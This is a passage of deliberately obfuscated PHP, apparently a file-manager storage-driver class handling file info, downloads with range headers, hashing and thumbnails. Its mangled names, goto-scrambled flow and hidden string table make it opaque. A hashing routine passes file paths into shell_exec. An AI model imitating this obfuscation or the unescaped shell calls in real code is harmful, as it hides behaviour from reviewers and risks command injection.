¹¤¡ ¥ = REPEAT_SKIP) { } public function copyFile($Cæù°ÂŸÀ, $CŒ¾´¬ñãÚ) { } public function moveFile($EÄæøˆ…, $e´©¶î˜¿Ö) { } public function remove($dåÍ’ªîé…) { if ($this->isFile($dåÍ’ªîé…)) { return $this->delFile($dåÍ’ªîé…); } return $this->delFolder($dåÍ’ªîé…); } public function rename($aÔ„ê‚‘Ò³, $b›òåÃî©») { } public function exist($CÛËåÇÑ­‹) { } public function findByHash($Cìß¾¼ï÷ = '', $a¢“‡‡Ì¨‰ = '') { return !1; } public function isFile($eèÛù˜ŠÌè) { } public function isFolder($bëÖ‰„»¬÷) { } public function size($BˆØšÄ¸) { } public function info($CÑˆÙßË²â) { } public function infoSimple($bæ‡ùÏ‘äˆ) { return $this->info($bæ‡ùÏ‘äˆ); } public function infoAuth($dš‚ Ú‹…) { return $this->info($dš‚ Ú‹…); } public function infoFull($bã¤ØèÎ¿ø) { return $this->info($bã¤ØèÎ¿ø); } public function infoWithChildren($Eé‚»ÉêŠ¼) { $EğŒÛÕ¯Å =& $_SERVER[Ìó]; $f§í·ğ’ã¸ = $this->info($Eé‚»ÉêŠ¼); if ($f§í·ğ’ã¸ && $f§í·ğ’ã¸[$EğŒÛÕ¯Å[29]] == $EğŒÛÕ¯Å[76]) { $dù¨ğÄ†º‘ = array($EğŒÛÕ¯Å[77] => 0, $EğŒÛÕ¯Å[78] => 0, $EğŒÛÕ¯Å[79] => 0); $this->infoChildren($Eé‚»ÉêŠ¼, $dù¨ğÄ†º‘); $f§í·ğ’ã¸[$EğŒÛÕ¯Å[77]] = $dù¨ğÄ†º‘[$EğŒÛÕ¯Å[77]]; $f§í·ğ’ã¸[$EğŒÛÕ¯Å[80]] = array($EğŒÛÕ¯Å[81] => $dù¨ğÄ†º‘[$EğŒÛÕ¯Å[78]], $EğŒÛÕ¯Å[82] => $dù¨ğÄ†º‘[$EğŒÛÕ¯Å[79]]); } return $f§í·ğ’ã¸; } public function listPath($eè·óôï³¼, $b‘ÄÇ¯²ãç = false) { } public function has($AÒ‘Ó©ºŒÛ, $FƒºÂŒÎ— = false, $Fã™É‡›ºŠ = false) { } public function canRead($bÛ©³×µÌì) { } public function canWrite($DÆ‘šãÈÍë) { } public function getContent($e‡†Ñæ°÷¶) { } public function setContent($càÚ¼²’×ß, $dİ¦õ›°›Ü = '') { } protected function infoChildren($a¦—À¡ôŒ, &$BÖ‡¶Å£³ï) { $b­ĞõöÉÁ =& $_SERVER[Ìó]; check_abort(); $Aãİ¨–Ó«Á = $this->listPath($a¦—À¡ôŒ, !0); $Aãİ¨–Ó«Á = array_merge($Aãİ¨–Ó«Á[$b­ĞõöÉÁ[74]], $Aãİ¨–Ó«Á[$b­ĞõöÉÁ[73]]); foreach ($Aãİ¨–Ó«Á as $C†¿›„ÁĞ) { if ($C†¿›„ÁĞ[$b­ĞõöÉÁ[29]] == $b­ĞõöÉÁ[76]) { $BÖ‡¶Å£³ï[$b­ĞõöÉÁ[79]]++; $D÷¼²©»¡® = $this->getPathInner($C†¿›„ÁĞ[$b­ĞõöÉÁ[75]]); $this->infoChildren($D÷¼²©»¡®, $BÖ‡¶Å£³ï); } else { $BÖ‡¶Å£³ï[$b­ĞõöÉÁ[78]]++; $BÖ‡¶Å£³ï[$b­ĞõöÉÁ[77]] += $C†¿›„ÁĞ[$b­ĞõöÉÁ[77]]; } } } public function fileSubstr($BĞìµ®¨ë, $AÄÅìÉó¯œ, $DßÆÖ÷»¥Ï) { } public function listAll($BÔæÒ—¨—ä) { } public function upload($cµÒµ¼¸â¦, $AÀ¿˜“ÅŠŒ, $b†ªÉ¥‰İ = false, $a‹†‚À¬‡ = REPEAT_REPLACE) { } public function uploadFileByID($dáË…à†ã, $d èó¾›áò, $B‚í¥ªÃäå) { } public function uploadFileByPath($aÆí”É²œø, $A¨òœÍÚã—, $aí©¿’ñÅğ = array()) { } public function isUploadServer() { $DùÃöƒ•Ÿ˜ =& $_SERVER[Ìó]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $DùÃöƒ•Ÿ˜[83]) { return !0; } return $GLOBALS[$DùÃöƒ•Ÿ˜[6]][$DùÃöƒ•Ÿ˜[84]][$DùÃöƒ•Ÿ˜[85]]; } public function isFileOutServer() { $eÕ±–°Æˆ« =& $_SERVER[Ìó]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $eÕ±–°Æˆ«[83]) { return !0; } return $GLOBALS[$eÕ±–°Æˆ«[6]][$eÕ±–°Æˆ«[84]][$eÕ±–°Æˆ«[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($b¯…½÷¡‹º) { $Aò“ÈŠÛöÜ =& $_SERVER[Ìó]; if (!$this->isCdnHost()) { return $b¯…½÷¡‹º; } return str_replace(trim(get_url_root($b¯…½÷¡‹º), $Aò“ÈŠÛöÜ[8]), trim($this->cdnHost, $Aò“ÈŠÛöÜ[8]), $b¯…½÷¡‹º); } public function uploadLink($aË¢‘Ö±ˆá, $eÔİÁ°—Õ© = 0) { goto D—¸ğ‘æ®ß; dÇĞíôŞ›Ù: if ($Fö•ã©Ø¿õ) { $Fö•ã©Ø¿õ[$B©®ò å‹•[89]] = $aË¢‘Ö±ˆá; $Fö•ã©Ø¿õ[$B©®ò å‹•[90]] = $aó¥”È¤; } return $Fö•ã©Ø¿õ; goto d«¶á”î˜ë; eñ’©—•ÜÊ: $EŠšÉ¢ñì° = $eÔİÁ°—Õ© <= $cåµÌßŞöç ? $B©®ò å‹•[87] : $B©®ò å‹•[88]; $aĞ½òí‹–× = (!$eÔİÁ°—Õ© ? 1 : ceil($eÔİÁ°—Õ© / pow(1024, 3))) * 3600 * 4; $Fö•ã©Ø¿õ = $this->{$EŠšÉ¢ñì°}($aË¢‘Ö±ˆá, $aĞ½òí‹–×); goto dÇĞíôŞ›Ù; D—¸ğ‘æ®ß: $B©®ò å‹• =& $_SERVER[Ìó]; if ($this->isUploadServer()) { return; } $aó¥”È¤ = $this->getType(); goto Aîá„‰¤™À; Aîá„‰¤™À: if (!in_array($aó¥”È¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $cåµÌßŞöç = 1024 * 1024 * 10; goto eñ’©—•ÜÊ; d«¶á”î˜ë: } public function uploadFormData($CÛãÆšå¶˜, $BÌ†£¾Œƒ = 3600) { } public function multiUploadFormData($E—Û¿ÑÓ’Ş, $fµóõˆ„´¿ = 3600) { } public function download($FÏÇ¡¬ŸëÙ, $dÊè‡à¤¦) { } public function ext($Bß•í¹Ê—) { $EŠƒ‹ù“ÄÃ =& $_SERVER[Ìó]; if (strpos($Bß•í¹Ê—, $EŠƒ‹ù“ÄÃ[8]) === -1) { $dãïä¼×ˆõ = $Bß•í¹Ê—; } else { $dãïä¼×ˆõ = $this->pathThis($Bß•í¹Ê—); } $AÛ¥ˆÀ·Ò“ = $EŠƒ‹ù“ÄÃ[33]; if (strstr($dãïä¼×ˆõ, $EŠƒ‹ù“ÄÃ[91])) { $AÛ¥ˆÀ·Ò“ = substr($dãïä¼×ˆõ, strrpos($dãïä¼×ˆõ, $EŠƒ‹ù“ÄÃ[91]) + 1); $AÛ¥ˆÀ·Ò“ = strtolower($AÛ¥ˆÀ·Ò“); } if (strlen($AÛ¥ˆÀ·Ò“) > 3 && preg_match($EŠƒ‹ù“ÄÃ[92], $AÛ¥ˆÀ·Ò“, $BàñÛ¾‡‹Ú)) { $AÛ¥ˆÀ·Ò“ = $EŠƒ‹ù“ÄÃ[33]; } return $AÛ¥ˆÀ·Ò“; } public function pathThis($dÆ‡£¾îå£) { $c»…á”í¹¡ =& $_SERVER[Ìó]; $dÆ‡£¾îå£ = str_replace($c»…á”í¹¡[93], $c»…á”í¹¡[8], rtrim($dÆ‡£¾îå£, $c»…á”í¹¡[8])); $CêË‚È¬À… = strrpos($dÆ‡£¾îå£, $c»…á”í¹¡[8]); if ($CêË‚È¬À… === !1) { return $dÆ‡£¾îå£; } return substr($dÆ‡£¾îå£, $CêË‚È¬À… + 1); } public function pathFather($C‹­ÛÅšÁ­) { $A®ËùéãÄ =& $_SERVER[Ìó]; $C‹­ÛÅšÁ­ = str_replace($A®ËùéãÄ[93], $A®ËùéãÄ[8], rtrim($C‹­ÛÅšÁ­, $A®ËùéãÄ[8])); $AëŠÓŒò… = strrpos($C‹­ÛÅšÁ­, $A®ËùéãÄ[8]); if ($AëŠÓŒò… === !1) { return $A®ËùéãÄ[33]; } return substr($C‹­ÛÅšÁ­, 0, $AëŠÓŒò… + 1); } public function hashSimple($aˆÊ£ÂÛº) { goto AŠ“ÉöŠ”ò; AŠ“ÉöŠ”ò: $f”Î £ØÕ® =& $_SERVER[Ìó]; if (!$aˆÊ£ÂÛº) { return md5($f”Î £ØÕ®[33]); } $bÇ³ŒËÀÀ‰ = $this->size($aˆÊ£ÂÛº); goto Cğ–àæ„ğ; c˜¯ŒÎ’ø: $cÄê­“‘â¤ .= $this->fileSubstr($aˆÊ£ÂÛº, $bÇ³ŒËÀÀ‰ - $B±µ§ŞÜ»±, $B±µ§ŞÜ»±); return md5($cÄê­“‘â¤) . $bÇ³ŒËÀÀ‰; goto eš”»›‚Ä„; Cğ–àæ„ğ: $B±µ§ŞÜ»± = 200; $BÒØ«¢›Æ = 50; if ($bÇ³ŒËÀÀ‰ <= $B±µ§ŞÜ»± * $BÒØ«¢›Æ) { return $this->hashMd5($aˆÊ£ÂÛº) . $bÇ³ŒËÀÀ‰; } goto B‘ÔëŠÚã; B‘ÔëŠÚã: $BÕá‘÷æÀˆ = intval($bÇ³ŒËÀÀ‰ / $BÒØ«¢›Æ); $cÄê­“‘â¤ = $f”Î £ØÕ®[33]; for ($D‹ß……©ù = 0; $D‹ß……©ù < $BÒØ«¢›Æ; $D‹ß……©ù++) { $cÄê­“‘â¤ .= $this->fileSubstr($aˆÊ£ÂÛº, $BÕá‘÷æÀˆ * $D‹ß……©ù, $B±µ§ŞÜ»±); } goto c˜¯ŒÎ’ø; eš”»›‚Ä„: } public static $md5Cache = array(); public function hashMd5($Cõâ„»¶Ñ÷) { $Cõâ„»¶Ñ÷ = $this->iconvSystem($Cõâ„»¶Ñ÷); if (isset(self::$md5Cache[$Cõâ„»¶Ñ÷])) { return self::$md5Cache[$Cõâ„»¶Ñ÷]; } self::$md5Cache[$Cõâ„»¶Ñ÷] = $this->hashMd5Shell($Cõâ„»¶Ñ÷); if (!self::$md5Cache[$Cõâ„»¶Ñ÷]) { self::$md5Cache[$Cõâ„»¶Ñ÷] = @md5_file($Cõâ„»¶Ñ÷); } return self::$md5Cache[$Cõâ„»¶Ñ÷]; } private function hashMd5Shell($fÚ”µÑåß¾) { goto AŠÌİ¥ß÷¤; A™•ŠŞÚ: $F’áË¶„–Æ = Cache::get($b¼Ë‚¶Æï[97]); if (!$F’áË¶„–Æ) { $fÇ´Æğ¦ƒ¢ = BASIC_PATH . $b¼Ë‚¶Æï[98]; $b«¨µ¶é¥² = md5_file($fÇ´Æğ¦ƒ¢); $F’áË¶„–Æ = $b¼Ë‚¶Æï[99]; foreach ($FŞ²†÷Êƒ as $bÎàŒÙã‹Ï) { $cøÀœÇò = shell_exec($bÎàŒÙã‹Ï . "\x20\x22{$fÇ´Æğ¦ƒ¢}\42"); if ($cøÀœÇò && substr(trim($cøÀœÇò), 0, 32) == $b«¨µ¶é¥²) { $F’áË¶„–Æ = $bÎàŒÙã‹Ï; break; } } Cache::set($b¼Ë‚¶Æï[97], $F’áË¶„–Æ, 3600); } if ($F’áË¶„–Æ == $b¼Ë‚¶Æï[99]) { return !1; } goto Cœºé˜’Æ™; Cœºé˜’Æ™: $cøÀœÇò = shell_exec($F’áË¶„–Æ . "\40\42{$fÚ”µÑåß¾}\42"); return substr($cøÀœÇò, 0, 32); goto f£ÕÎÛÚòØ; AŠÌİ¥ß÷¤: $b¼Ë‚¶Æï =& $_SERVER[Ìó]; if (!function_exists($b¼Ë‚¶Æï[94])) { return !1; } $FŞ²†÷Êƒ = array($b¼Ë‚¶Æï[95], $b¼Ë‚¶Æï[96]); goto A™•ŠŞÚ; f£ÕÎÛÚòØ: } public function link($Fƒ“ŞÄ‘¬­) { return $Fƒ“ŞÄ‘¬­; } public function fileOut($eˆĞçÌˆ†, $A¢‘ë¥ƒìç = false, $CÁ²ò™Ú„¢ = false, $cÅºÑ›“‘Ÿ = '') { goto DõŠÜÊÖò; CùÎ‘á‚ò±: $a³êàíÊ® = get_file_mime($d¬÷•—İãæ); if (strstr($a³êàíÊ®, $DŒ›óÎ áŠ[113])) { $a³êàíÊ® = $a³êàíÊ® . $DŒ›óÎ áŠ[114]; } if ($A¢‘ë¥ƒìç === !1 && !mime_support($a³êàíÊ®)) { $A¢‘ë¥ƒìç = !0; $a³êàíÊ® = $DŒ›óÎ áŠ[115]; } goto eê‘‹ò“Î³; aˆ°í’çµ‚: $f…ƒöæÔœÍ = $EšÄøßÓèÚ[$DŒ›óÎ áŠ[77]]; $c´§¸³½¿Ó = gmdate($DŒ›óÎ áŠ[105], $EšÄøßÓèÚ[$DŒ›óÎ áŠ[106]]); $câÖ¥Êâ = $CÁ²ò™Ú„¢ ? $CÁ²ò™Ú„¢ : $this->iconvApp($EšÄøßÓèÚ[$DŒ›óÎ áŠ[28]]); goto e÷ŞË™ò†§; DõŠÜÊÖò: $DŒ›óÎ áŠ =& $_SERVER[Ìó]; $this->cacheMethod(null, null); if (!$eˆĞçÌˆ† || !$this->exist($eˆĞçÌˆ†)) { show_json(LNG($DŒ›óÎ áŠ[100]), !1, $CÁ²ò™Ú„¢); } goto aêÇÓÄ²; bŞåİ æİš: $f°ğÀâùª = strtolower($_SERVER[$DŒ›óÎ áŠ[137]]); if ($D¬°Å›»œ && $f°ğÀâùª && $b¦¿›ê®ß) { if (strstr($f°ğÀâùª, $DŒ›óÎ áŠ[138])) { header($DŒ›óÎ áŠ[139] . $eˆĞçÌˆ†); } else { if (strstr($f°ğÀâùª, $DŒ›óÎ áŠ[140])) { header($DŒ›óÎ áŠ[141] . $eˆĞçÌˆ†); } else { if (strstr($f°ğÀâùª, $DŒ›óÎ áŠ[142])) { header($DŒ›óÎ áŠ[143] . $eˆĞçÌˆ†); } } } if ($dö…‹ôçäõ) { header($DŒ›óÎ áŠ[144] . $dö…‹ôçäõ); } return; } if (isset($_SERVER[$DŒ›óÎ áŠ[145]])) { if (preg_match($DŒ›óÎ áŠ[146], $_SERVER[$DŒ›óÎ áŠ[145]], $Aéí¢â¢ˆ‹)) { $eÕÜ‰²ñº = intval($Aéí¢â¢ˆ‹[1]); if (!empty($Aéí¢â¢ˆ‹[2])) { $c·¡ô˜ó®è = intval($Aéí¢â¢ˆ‹[2]); } } header($DŒ›óÎ áŠ[147]); header("\x43\157\x6e\x74\145\x6e\164\55\122\x61\156\147\145\x3a\40\142\171\164\x65\163\40{$eÕÜ‰²ñº}\x2d{$c·¡ô˜ó®è}\x2f" . $f…ƒöæÔœÍ); } else { header($DŒ›óÎ áŠ[148]); } goto fÖäÕ…“å; b¹¯óè¬È: header($DŒ›óÎ áŠ[120]); header($DŒ›óÎ áŠ[121] . $a³êàíÊ®); header($DŒ›óÎ áŠ[122] . gmdate($DŒ›óÎ áŠ[105], time() + 3600 * 24 * 30) . $DŒ›óÎ áŠ[123]); goto cƒ—Î«È—ç; Fê‡”÷Ö¹Õ: header($DŒ›óÎ áŠ[131] . $c´§¸³½¿Ó . $DŒ›óÎ áŠ[123]); header($DŒ›óÎ áŠ[132] . $câÖ¥Êâ); header($DŒ›óÎ áŠ[133]); goto fÄÇ¾¯‹¾; bª“¸„å½: $b¥è½‹òŞˆ = 0; if ($dö…‹ôçäõ) { $b¥è½‹òŞˆ = intval(1000 * 1000 * ($b ×¨ŸºÑè / $dö…‹ôçäõ)); } while ($eÕÜ‰²ñº <= $c·¡ô˜ó®è) { $bã’ôª§ìŠ = timeFloat(); check_abort(); $eñíí øãÂ = $c·¡ô˜ó®è - $eÕÜ‰²ñº + 1; if ($eñíí øãÂ <= $b ×¨ŸºÑè) { $b ×¨ŸºÑè = $eñíí øãÂ; } echo $this->fileSubstr($eˆĞçÌˆ†, $eÕÜ‰²ñº, $b ×¨ŸºÑè); $eÕÜ‰²ñº += $b ×¨ŸºÑè; if ($b ×¨ŸºÑè == $eñíí øãÂ) { $eÕÜ‰²ñº = $c·¡ô˜ó®è + 1; } if ($b¥è½‹òŞˆ) { $D‹¯‘ï®šÎ = intval(1000 * 1000 * (timeFloat() - $bã’ôª§ìŠ)); $a•ÔêÇ‡ = $b¥è½‹òŞˆ - $D‹¯‘ï®šÎ; if ($a•ÔêÇ‡ > 5) { usleep($a•ÔêÇ‡); } } } goto bë°ç©’…Ä; eê‘‹ò“Î³: $däÉõ“Ê‚ = rawurlencode($câÖ¥Êâ); $däÉõ“Ê‚ = $DŒ›óÎ áŠ[112] . $däÉõ“Ê‚ . $DŒ›óÎ áŠ[116] . $däÉõ“Ê‚; if ($A¢‘ë¥ƒìç) { header($DŒ›óÎ áŠ[117]); header($DŒ›óÎ áŠ[118] . $däÉõ“Ê‚); } else { header($DŒ›óÎ áŠ[119] . $däÉõ“Ê‚); } goto b¹¯óè¬È; cƒ—Î«È—ç: header($DŒ›óÎ áŠ[124]); header($DŒ›óÎ áŠ[125]); header($DŒ›óÎ áŠ[126]); goto fƒ„ÃŒ¥÷÷; fƒ„ÃŒ¥÷÷: if (isset($_SERVER[$DŒ›óÎ áŠ[127]]) && strtotime($_SERVER[$DŒ›óÎ áŠ[127]]) == $EšÄøßÓèÚ[$DŒ›óÎ áŠ[106]]) { header($DŒ›óÎ áŠ[128], !0, 304); die; } if (isset($_SERVER[$DŒ›óÎ áŠ[129]]) && $_SERVER[$DŒ›óÎ áŠ[129]] == $cÅºÑ›“‘Ÿ) { header($DŒ›óÎ áŠ[130] . $cÅºÑ›“‘Ÿ, !0, 304); die; } header($DŒ›óÎ áŠ[130] . $cÅºÑ›“‘Ÿ); goto Fê‡”÷Ö¹Õ; D×«‘”œ¶‘: @ob_end_clean(); set_timeout(); $EšÄøßÓèÚ = $this->infoFull($eˆĞçÌˆ†); goto aˆ°í’çµ‚; aêÇÓÄ²: $D¬°Å›»œ = $this->getType() == $DŒ›óÎ áŠ[101]; $b¦¿›ê®ß = $GLOBALS[$DŒ›óÎ áŠ[6]][$DŒ›óÎ áŠ[84]][$DŒ›óÎ áŠ[102]][$DŒ›óÎ áŠ[103]]; $dö…‹ôçäõ = (double) $GLOBALS[$DŒ›óÎ áŠ[6]][$DŒ›óÎ áŠ[84]][$DŒ›óÎ áŠ[102]][$DŒ›óÎ áŠ[104]] * 1024 * 1024; goto D×«‘”œ¶‘; fÖäÕ…“å: header($DŒ›óÎ áŠ[149] . ($c·¡ô˜ó®è - $eÕÜ‰²ñº + 1)); if ($_SERVER[$DŒ›óÎ áŠ[150]] == $DŒ›óÎ áŠ[151]) { return; } $b ×¨ŸºÑè = 1024 * 100; goto bª“¸„å½; C»³Åœ÷éÁ: if (in_array($d¬÷•—İãæ, array($DŒ›óÎ áŠ[107], $DŒ›óÎ áŠ[108], $DŒ›óÎ áŠ[109], $DŒ›óÎ áŠ[110]))) { $d¬÷•—İãæ = $DŒ›óÎ áŠ[111]; } if (!$cÅºÑ›“‘Ÿ) { $cÅºÑ›“‘Ÿ = md5($c´§¸³½¿Ó . $this->hashSimple($eˆĞçÌˆ†)); } $cÅºÑ›“‘Ÿ = $DŒ›óÎ áŠ[112] . $cÅºÑ›“‘Ÿ . $DŒ›óÎ áŠ[112]; goto CùÎ‘á‚ò±; e÷ŞË™ò†§: $eÕÜ‰²ñº = 0; $c·¡ô˜ó®è = $f…ƒöæÔœÍ - 1; $d¬÷•—İãæ = $this->ext($câÖ¥Êâ); goto C»³Åœ÷éÁ; fÄÇ¾¯‹¾: header($DŒ›óÎ áŠ[134] . $f…ƒöæÔœÍ); header($DŒ›óÎ áŠ[135]); if (!$A¢‘ë¥ƒìç && $d¬÷•—İãæ == $DŒ›óÎ áŠ[136]) { if ($f…ƒöæÔœÍ > 1024 * 1024 * 5) { die; } $FŠÙêÙä„ = $this->getContent($eˆĞçÌˆ†); $FŠÙêÙä„ = Html::clearSVG($FŠÙêÙä„); echo $FŠÙêÙä„; die; } goto bŞåİ æİš; bë°ç©’…Ä: } public function fileOutServer($b¢Íåã“², $AŒÈ®´Ñ“ = false, $A ‡µ§ ›½ = false, $A¿îº¹º† = '') { $this->fileOut($b¢Íåã“², $AŒÈ®´Ñ“, $A ‡µ§ ›½, $A¿îº¹º†); } public function fileOutLink($bœÄÚˆ¢ö) { header($_SERVER[Ìó][152] . $bœÄÚˆ¢ö); die; } public function cacheMethod($bš¹á—ìÜ¾, $Eº÷¬ö­ÌŒ) { goto aˆ‡½‚ŸÄâ; BîœçÌ‰¬Ñ: if (!is_null($FäÜ¦®â)) { return $FäÜ¦®â; } $FäÜ¦®â = $this->{$bš¹á—ìÜ¾}($Eº÷¬ö­ÌŒ); $a®ô‘„î¥[$eÉÊë‘ÓÛ´] = $FäÜ¦®â; goto a£Ç–Ä†§Ë; aˆ‡½‚ŸÄâ: $Aß‘ÏáÆ² =& $_SERVER[Ìó]; static $a®ô‘„î¥ = array(); $eÉÊë‘ÓÛ´ = $Aß‘ÏáÆ²[153] . $bš¹á—ìÜ¾ . $Aß‘ÏáÆ²[154] . rtrim($Eº÷¬ö­ÌŒ, $Aß‘ÏáÆ²[8]); goto fê‡ã»£†; a£Ç–Ä†§Ë: return $FäÜ¦®â; goto E†§îôÑÔô; fê‡ã»£†: if (is_null($bš¹á—ìÜ¾)) { $a®ô‘„î¥ = array(); return; } if (is_null($Eº÷¬ö­ÌŒ)) { unset($a®ô‘„î¥[$eÉÊë‘ÓÛ´]); return; } $FäÜ¦®â = isset($a®ô‘„î¥[$eÉÊë‘ÓÛ´]) ? $a®ô‘„î¥[$eÉÊë‘ÓÛ´] : null; goto BîœçÌ‰¬Ñ; E†§îôÑÔô: } public function fileOutImage($aÀ‡¯µ‘¹ì, $a ·óçğÙŞ = 250) { goto có·æ£†; CÉ›‚àÓ: if ($Fùˆ·Îö”“[$eÇ°°°ßİæ[77]] <= 1024 * 50 || !function_exists($eÇ°°°ßİæ[155]) || $Fùˆ·Îö”“[$eÇ°°°ßİæ[156]] == $eÇ°°°ßİæ[157]) { return $this->fileOut($aÀ‡¯µ‘¹ì); } if (isset($Fùˆ·Îö”“[$eÇ°°°ßİæ[158]][$eÇ°°°ßİæ[159]])) { $b©è˜àÓÑŸ = $Fùˆ·Îö”“[$eÇ°°°ßİæ[158]][$eÇ°°°ßİæ[159]]; } else { if (isset($Fùˆ·Îö”“[$eÇ°°°ßİæ[158]][$eÇ°°°ßİæ[160]])) { $b©è˜àÓÑŸ = $Fùˆ·Îö”“[$eÇ°°°ßİæ[158]][$eÇ°°°ßİæ[160]]; } else { $b©è˜àÓÑŸ = md5("{$Fùˆ·Îö”“[$eÇ°°°ßİæ[28]]}\x5f{$Fùˆ·Îö”“[$eÇ°°°ßİæ[75]]}\x5f{$Fùˆ·Îö”“[$eÇ°°°ßİæ[77]]}"); } } $A´‡Ú¹ÁÕÄ = "{$b©è˜àÓÑŸ}\137{$a ·óçğÙŞ}\56\160\x6e\147"; goto A›ĞŠ‘Ãµ; aÁ™Åî—Üã: if (!($Fó‹³²ìÃ¡ = IO::move($FÉŞ‚Ïİ–, $f¶½Ä¿©ù))) { return IO::fileOut($FÉŞ‚Ïİ–); } del_file($FÉŞ‚Ïİ–); IO::fileOut($Fó‹³²ìÃ¡); goto aô¤¯í¿”’; có·æ£†: $eÇ°°°ßİæ =& $_SERVER[Ìó]; if (substr($aÀ‡¯µ‘¹ì, 0, 4) == $eÇ°°°ßİæ[142]) { $this->fileOutLink($aÀ‡¯µ‘¹ì); } $Fùˆ·Îö”“ = $this->info($aÀ‡¯µ‘¹ì); goto CÉ›‚àÓ; F²™ÜÑò™£: $FÉŞ‚Ïİ– = DATA_THUMB . $A´‡Ú¹ÁÕÄ; if (!@file_exists($FÉŞ‚Ïİ–)) { $D×µ›™¹ = TEMP_FILES; if (!is_dir($D×µ›™¹)) { mk_dir($D×µ›™¹); } $b£ÎÆòçº = $D×µ›™¹ . $b©è˜àÓÑŸ . $eÇ°°°ßİæ[91] . $Fùˆ·Îö”“[$eÇ°°°ßİæ[156]]; if (!@file_exists($b£ÎÆòçº)) { $b£ÎÆòçº = $this->download($aÀ‡¯µ‘¹ì, $b£ÎÆòçº); } $F›ˆĞ¤ÊÎÃ = new ImageThumb($b£ÎÆòçº, $eÇ°°°ßİæ[163]); $F›ˆĞ¤ÊÎÃ->prorate($FÉŞ‚Ïİ–, $a ·óçğÙŞ, $a ·óçğÙŞ * 10); } if (!file_exists($FÉŞ‚Ïİ–) || filesize($FÉŞ‚Ïİ–) < 100) { return @file_exists($b£ÎÆòçº) ? IO::fileOut($b£ÎÆòçº) : $this->fileOut($aÀ‡¯µ‘¹ì); } goto aÁ™Åî—Üã; A›ĞŠ‘Ãµ: if (!($d‚…¥éŒ³’ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $eÇ°°°ßİæ[161]))) { $f¶½Ä¿©ù = IO::mkdir(IO_PATH_SYSTEM_TEMP . $eÇ°°°ßİæ[162]); } else { $f¶½Ä¿©ù = KodIO::make($d‚…¥éŒ³’); } if ($d‚…¥éŒ³’ = IO::fileNameExist($f¶½Ä¿©ù, $A´‡Ú¹ÁÕÄ)) { $FÉŞ‚Ïİ– = KodIO::make($d‚…¥éŒ³’); return IO::fileOut($FÉŞ‚Ïİ–); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto F²™ÜÑò™£; aô¤¯í¿”’: } public function fileOutImageServer($Bİ¾¬»ˆÕ», $aëÏªÌÖ¥ = 250) { $this->fileOutImage($Bİ¾¬»ˆÕ», $aëÏªÌÖ¥); } public function fileNameAuto($A—ŠçáëÓ½, $FÏÃË¯¿ñÍ, $aÀœ¼Šë¨ = REPEAT_RENAME, $a¾²§¿Ñ»ƒ = false) { goto fÇ£ËÛ³èŠ; C¥Âôí¦¤ñ: while ($this->exist(rtrim($A—ŠçáëÓ½, $Eáã÷ÄŠ[8]) . $Eáã÷ÄŠ[8] . $aŞ…†ÅëˆÉ)) { $aŞ…†ÅëˆÉ = $Aï…µù åù . "\50{$d“ö¢ÃáÃ}\51{$dÁŒ˜Ş…áâ}"; $d“ö¢ÃáÃ++; } return $aŞ…†ÅëˆÉ; goto DÎ½ÏÚÏ; C“íÁÌœ·•: if ($aÀœ¼Šë¨ == REPEAT_SKIP) { return !1; } $dÁŒ˜Ş…áâ = $Eáã÷ÄŠ[91] . get_path_ext($FÏÃË¯¿ñÍ); $dÁŒ˜Ş…áâ = $dÁŒ˜Ş…áâ == $Eáã÷ÄŠ[91] || $a¾²§¿Ñ»ƒ ? $Eáã÷ÄŠ[33] : $dÁŒ˜Ş…áâ; goto C°Ú¦ÏøÚœ; fÇ£ËÛ³èŠ: $Eáã÷ÄŠ =& $_SERVER[Ìó]; $E©¾“œ½‰¤ = $A—ŠçáëÓ½ === $Eáã÷ÄŠ[33] ? $FÏÃË¯¿ñÍ : rtrim($A—ŠçáëÓ½, $Eáã÷ÄŠ[8]) . $Eáã÷ÄŠ[8] . $FÏÃË¯¿ñÍ; if ($aÀœ¼Šë¨ == REPEAT_REPLACE || !$this->exist($E©¾“œ½‰¤) || $a¾²§¿Ñ»ƒ && $aÀœ¼Šë¨ != REPEAT_RENAME_FOLDER) { return $FÏÃË¯¿ñÍ; } goto C“íÁÌœ·•; C°Ú¦ÏøÚœ: $d“ö¢ÃáÃ = 1; $Aï…µù åù = substr($FÏÃË¯¿ñÍ, 0, strlen($FÏÃË¯¿ñÍ) - strlen($dÁŒ˜Ş…áâ)); $aŞ…†ÅëˆÉ = $Aï…µù åù . "\50{$d“ö¢ÃáÃ}\x29{$dÁŒ˜Ş…áâ}"; goto C¥Âôí¦¤ñ; DÎ½ÏÚÏ: } public function listAllFiles($E»¬Â©— á, $B¢Ó‘ö¢š¦, $fŒòÆ™‚µ = array()) { goto eæß†Ü‡Ì¥; EŒÄ¿Å¸‰Ø: $E»¬Â©— á = trim($E»¬Â©— á, $A¥ğÇ’—è[8]); foreach ($B¢Ó‘ö¢š¦ as $Eßôó‡£§˜) { $e˜ÆçŒ ê = ltrim(substr($Eßôó‡£§˜, strlen($E»¬Â©— á)), $A¥ğÇ’—è[8]); $Bâé¾£„®® = array_merge($Bâé¾£„®®, $this->slicePath($e˜ÆçŒ ê)); } $Cô‚Ùî¨ª = array(); goto dÇÇ¤ĞÙÕ; dÇÇ¤ĞÙÕ: foreach (array_unique($Bâé¾£„®®) as $Eßôó‡£§˜) { $c˜ãµ‚êíŠ = array($A¥ğÇ’—è[75] => $this->getPathOuter($A¥ğÇ’—è[8] . $E»¬Â©— á . $A¥ğÇ’—è[8] . $Eßôó‡£§˜), $A¥ğÇ’—è[76] => 1, $A¥ğÇ’—è[77] => 0); if (substr($Eßôó‡£§˜, -1) != $A¥ğÇ’—è[8]) { $c˜ãµ‚êíŠ[$A¥ğÇ’—è[76]] = 0; $a–ñˆ°¼åá = $this->getPath($E»¬Â©— á . $A¥ğÇ’—è[8] . $Eßôó‡£§˜); $c˜ãµ‚êíŠ[$A¥ğÇ’—è[77]] = isset($fŒòÆ™‚µ[$a–ñˆ°¼åá]) ? $fŒòÆ™‚µ[$a–ñˆ°¼åá] : $this->size($a–ñˆ°¼åá); } $Cô‚Ùî¨ª[] = $c˜ãµ‚êíŠ; } return $Cô‚Ùî¨ª; goto A–ãô ³¹Â; eæß†Ü‡Ì¥: $A¥ğÇ’—è =& $_SERVER[Ìó]; if 